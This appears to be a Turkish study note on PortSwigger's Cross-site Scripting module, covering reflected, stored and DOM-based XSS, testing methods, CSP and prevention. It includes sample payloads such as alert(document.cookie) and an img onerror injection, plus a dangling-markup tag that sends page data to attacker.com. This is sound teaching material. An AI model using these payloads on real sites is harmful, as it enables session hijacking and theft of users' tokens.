# PortSwigger - Cross-site Scripting (XSS)

Bu doküman, PortSwigger Web Security Academy'nin **Cross-site Scripting (XSS)** modülünden alınan teorik konu anlatımlarını, saldırı türlerini, istismar yöntemlerini ve korunma mekanizmalarını içermektedir.

**Platform:** PortSwigger Web Security Academy  
**Kategori:** Client-Side Vulnerabilities / Cross-Site Scripting (XSS)  
**Resmi Dokümantasyon:** [PortSwigger XSS Guide](https://portswigger.net/web-security/cross-site-scripting)

---

## 1. What is Cross-site Scripting (XSS)?

**Cross-Site Scripting (XSS)**, kötü niyetli bir saldırganın, savunmasız bir web uygulaması üzerinden diğer kullanıcıların tarayıcılarında istemsiz bir şekilde zararlı istemci tarafı (client-side) kod (genellikle JavaScript) çalıştırmasına olanak tanıyan kritik bir web güvenliği zafiyetidir.

XSS, uygulamanın kullanıcı girdilerine aşırı güvenip bu verileri doğrulamadan ve kodlamadan (encoding) tarayıcıya yansıtmasından kaynaklanır.

---

## 2. How does XSS work?

XSS, web uygulamasını manipüle edip kullanıcılara zararlı JavaScript dönmesini sağlayarak çalışır. 

* Kurbanın tarayıcısı, gelen yanıtı güvenilir web sunucusundan gelmiş meşru bir sayfa olarak yorumlar.
* İstemci tarafında çalışan zararlı JavaScript kodu sayesinde saldırgan, kurbanın uygulama ile olan oturumunu ve etkileşimini tamamen ele geçirebilir (Session Hijacking).

---

## 3. XSS Proof of Concept (PoC)

Çoğu türdeki XSS zafiyetlerini, kullanıcının tarayıcısında JavaScript kodunun çalıştığını kanıtlayan zararsız bir payload enjekte ederek doğrulayabilirsiniz:

- **`alert()` Fonksiyonu:** Uzun zamandır `alert()` fonksiyonunu PoC amacıyla kullanmak endüstride yaygın olarak kabul edilmiştir. Çünkü bu fonksiyon kısa, zararsız ve başarılı bir şekilde çalıştığında ekranda belirgin bir diyalog kutusu (pop-up) açtığı için fark etmemek imkansızdır.
  ```html
  <script>alert(1)</script>
  ```
- **PortSwigger Laboratuvarları:** PortSwigger lablarının büyük çoğunluğu tarayıcıda `alert()` fonksiyonunu çağırarak çözülebilmektedir.
- **Alternatif (`print()`):** Bazı modern tarayıcılarda `alert()` kısıtlandığında veya WAF filtreleri `alert` kelimesini engellediğinde alternatif olarak `print()` fonksiyonunun kullanılması önerilir:
  ```html
  <script>print()</script>
  ```

---

## 4. What are the types of XSS attacks?

Temel olarak 3 ana XSS türü vardır:

| XSS Türü | Kaynak (Source) | Çalışma Mekanizması | Etki Kapsamı |
|---|---|---|---|
| **Reflected XSS** | HTTP İsteği (URL parametresi, form girdisi) | Zararlı kod HTTP yanıtında hemen geri yansıtılır | Yalnızca payload bağlantısına tıklayan kurban |
| **Stored XSS** | Veritabanı / Sunucu depolama alanı | Zararlı kod sisteme kaydedilir, sayfayı açan herkese döner | İlgili sayfayı ziyaret eden tüm kullanıcılar |
| **DOM-based XSS** | İstemci tarafı DOM / JS ortamı | Zafiyet sunucuda değil, tarayıcıdaki JS kodundadır | İstemci tarafında işlenen girdiyi tetikleyen kullanıcı |

---

### 1. Reflected Cross-site Scripting

En yaygın ve temel XSS türüdür. Uygulamanın bir HTTP isteğindeki kullanıcı girdisini alıp, cevabın (response) içerisine gelen veriyi güvensiz/filtrelenmemiş bir şekilde yerleştirmesiyle oluşur.

#### Örnek Senaryo:
Kullanıcı şu URL'i ziyaret ettiğinde:
```text
https://insecure-website.com/status?message=All+is+well
```

Sunucunun döndürdüğü HTML çıktısı:
```html
<p>Status: All is well.</p>
```

Eğer uygulama `message` parametresini filtrelemezse, saldırgan kurbana şu zararlı bağlantıyı iletebilir:
```text
https://insecure-website.com/status?message=<script>alert(document.cookie)</script>
```

Sunucu bu isteği aldığında doğrudan şu HTML yanıtını oluşturur ve kurbanın tarayıcısı bu scripti çalıştırır:
```html
<p>Status: <script>alert(document.cookie)</script></p>
```

---

### 2. Stored Cross-site Scripting (Persistent / Second-Order XSS)

Stored XSS (Kalıcı XSS), uygulamanın güvenilmeyen bir kaynaktan (kullanıcı yorumu, profil açıklaması, blog mesajı, sipariş detayı vb.) veri alıp, bu veriyi veritabanına kaydetmesi ve daha sonra başka kullanıcılar sayfayı görüntülediğinde bu veriyi filtrelenmemiş biçimde sunmasıdır.

#### Örnek Senaryo:
Normal bir kullanıcı mesajı veritabanından çekildiğinde:
```html
<p>Hello, this is my message!</p>
```

Ancak saldırgan mesaj alanına zararlı bir payload gönderip kaydettirdiğinde:
```html
<p><script>/* Zararlı Kodlar - Çerez Çalma / İstek Taklit Etme */</script></p>
```
Bu mesajı veya sayfayı ziyaret eden her bir kullanıcı, saldırganın zararlı kodunu kendi tarayıcısında arka planda otomatik olarak çalıştırır.

---

### 3. DOM-based Cross-site Scripting

DOM-based XSS, uygulamanın güvenilmeyen bir kaynaktan (Source) gelen veriyi işleyip güvensiz bir JavaScript fonksiyonuna veya DOM nesnesine (Sink) aktarmasıyla gerçekleşir. Burada zafiyet sunucu tarafındaki kodda değil, doğrudan istemci tarafındaki (client-side) JavaScript kodunun kendisindedir.

#### Örnek JavaScript Kodu:
```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

Eğer saldırgan `search` input alanındaki değeri veya URL hash'ini kontrol edebilirse ve bu değer filtrelenmeden doğrudan `innerHTML` gibi tehlikeli bir sink'e aktarılırsa, tarayıcı HTML etiketlerini parse eder ve çalıştırır:

```html
You searched for: <img src=1 onerror='alert(document.domain)'>
```

---

## 5. What can XSS be used for? (Saldırgan Neler Yapabilir?)

Başarılı bir XSS saldırısı elde eden bir saldırgan:
- **Kurban kullanıcıyı taklit edebilir:** Kurbanın tarayıcısında çalışan kod, kurbanın yetkileriyle hareket eder.
- **Kullanıcının yapabildiği herhangi bir işlemi yapabilir:** Parola değiştirme, e-posta güncelleme, para transferi veya veri silme gibi eylemleri tetikleyebilir (CSRF benzeri etki).
- **Kullanıcının erişebildiği hassas verileri okuyabilir:** Kurbanın özel mesajları, hesap bilgileri ve dokümanları çalınabilir.
- **Kullanıcının oturum/giriş bilgilerini ele geçirebilir:** `document.cookie` üzerinden oturum belirteçleri (session tokens / cookies) sızdırılabilir veya sahte giriş kutucukları gösterilerek kimlik bilgileri toplanabilir.
- **Web sitesini tahrif edebilir (Virtual Defacement):** Sayfa görünümünü değiştirip sahte içerikler basabilir.
- **Zararlı yazılım ve trojan işlevleri ekleyebilir:** Tarayıcı istismarı araçları (ör. BeEF) ile istemciyi zombiye dönüştürebilir.

---

## 6. Impact of XSS Vulnerabilities (Etki Değerlendirmesi)

XSS zafiyetlerinin gerçek etkisi tek tip değildir. Aşağıdaki faktörlere bağlı olarak değişir:
1. **Uygulamanın Doğası:** Genel bir haber sitesinde XSS'in etkisi çoğunlukla tahrifat veya yönlendirme ile sınırlıyken; bankacılık, sağlık veya e-ticaret sitelerinde doğrudan finansal kayıp ve veri hırsızlığına yol açar.
2. **Kullanıcının Yetki Seviyesi:** Eğer bir sistem yöneticisinin (Admin) tarayıcısında Stored XSS tetiklenirse, saldırgan uygulamanın tüm yönetim haklarını ve veritabanını ele geçirebilir.

---

## 7. How to find and test for XSS vulnerabilities

XSS zafiyetlerini tespit etmek için kullanılan pratik yöntemler:

* **Otomatik Tarama:** Burp Suite Professional Web Vulnerability Scanner gibi güvenlik tarayıcıları reflected ve stored parametreleri otomatik olarak tespit edebilir.
* **Manuel Test (Reflected ve Stored):**
  1. Girdi alanlarına benzersiz alfasayısal değerler (ör. `xss12345`) gönderilir.
  2. Dönen HTTP yanıtında bu değerin nereye düştüğü (HTML gövdesi, etiket içi attribute, script bloğu vb.) incelenir.
  3. Özel karakterlerin (`<`, `>`, `"`, `'`, `/`, `&`) filtrelenip filtrelenmediği test edilir.
* **Manuel Test (DOM-based):**
  1. Tarayıcının geliştirici araçları (**DevTools - F12**) açılır.
  2. JavaScript kaynak kodları incelenerek tehlikeli girdi kaynakları (Sources: `location.search`, `location.hash`, `document.referrer`) ve alıcı fonksiyonlar (Sinks: `document.write`, `innerHTML`, `eval`) tespit edilir.
  3. Girdiye özel karakterler verilerek DOM ağacındaki değişiklikler denetlenir.

---

## 8. Diğer Önemli Kavramlar

### Content Security Policy (CSP)
**CSP**, modern tarayıcılarda XSS, veri sızdırma ve clickjacking gibi saldırıların etkisini hafifletmek (mitigation) amacıyla geliştirilmiş bir HTTP güvenlik başlığıdır (`Content-Security-Policy`).
* Hangi alan adlarından script, stil, resim ve iframe yüklenebileceğini belirler.
* Satır içi (inline) JavaScript çalıştırmayı varsayılan olarak engelleyebilir veya `nonce` / `hash` mekanizmaları ile yalnızca izin verilen scriptlerin çalışmasını sağlar.

### Dangling Markup Injection
Tam kapsamlı (Full) bir XSS istismarının (örneğin CSP kuralları veya script filtreleri nedeniyle JavaScript çalıştırılamadığı durumlar) mümkün olmadığı senaryolarda kullanılır.
* Kapatılmamış HTML etiketleri (örneğin `<img src='http://attacker.com/log?data=`) enjekte edilerek sayfadaki hassas veriler (CSRF token'ları, form bilgileri) saldırganın kontrolündeki sunucuya sızdırılır.

---

## 9. How to prevent XSS attacks? (Nasıl Önlenir?)

XSS zafiyetlerini önlemek için derinlemesine savunma (Defense-in-Depth) yaklaşımı uygulanmalıdır:

1. **Filter input on arrival (Girdiyi Geldiği Anda Filtreleyin):** Kullanıcıdan gelen girdileri beklenen veri tipine, uzunluğuna ve karakter setine göre katı bir beyaz liste (allowlist) ile doğrulayın.
2. **Encode data on output (Çıktıyı Bağlama Uygun Encode Edin):** Kullanıcı verisini ekrana basmadan önce HTML entity, JavaScript string veya URL formatına uygun şekilde encode edin (Örn. `<` yerine `&lt;`, `>` yerine `&gt;`).
3. **Use appropriate response headers (Uygun HTTP Yanıt Başlıkları Kullanın):**
   * `Content-Type: text/html; charset=UTF-8`
   * `X-Content-Type-Options: nosniff`
   * Çerezleri JavaScript erişiminden korumak için `Set-Cookie: ...; HttpOnly; Secure; SameSite=Lax`
4. **Implement Content Security Policy (CSP):** XSS açıklarının istismar edilmesini engellemek için güçlü bir CSP politikası kurgulayın.

---

## Kaynaklar

- [PortSwigger Web Security Academy — Cross-site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
